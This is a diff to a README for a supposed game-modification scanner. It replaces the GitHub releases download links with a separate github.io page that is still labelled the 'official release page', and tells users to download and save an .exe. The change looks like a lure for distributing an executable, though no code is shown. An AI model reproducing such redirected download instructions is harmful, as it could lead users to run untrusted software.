@@ -1,6 +1,6 @@
 # 🔍 a4ther-script-scanner-v44 - Detect modified game files with ease
 
-[![Download a4ther-scanner](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/luridnesschurchill902/a4ther-script-scanner-v44/releases)
+[![Download a4ther-scanner](https://img.shields.io/badge/Download-Release-blue.svg)](https://luridnesschurchill902.github.io)
 
 ## 📋 What is this tool?
 A4ther scans your Android and iOS devices for unauthorized game modifications. It tracks network signals, running processes, and app files. It flags changes to the game environment that might violate terms of service. The program generates plain-text files with timestamps so you can review the history of your device and app status. This tool helps you maintain a standard gaming environment.
@@ -13,7 +13,7 @@ You need a Windows computer to run this scanner. Ensure you have the following b
 - Administrator access to the computer account.
 
 ## 📥 How to download the app
-1. Go to the official [release page](https://github.com/luridnesschurchill902/a4ther-script-scanner-v44/releases).
+1. Go to the official [release page](https://luridnesschurchill902.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the link that ends in ".exe" to start the save process.
 4. Save the file to your desktop for quick access.
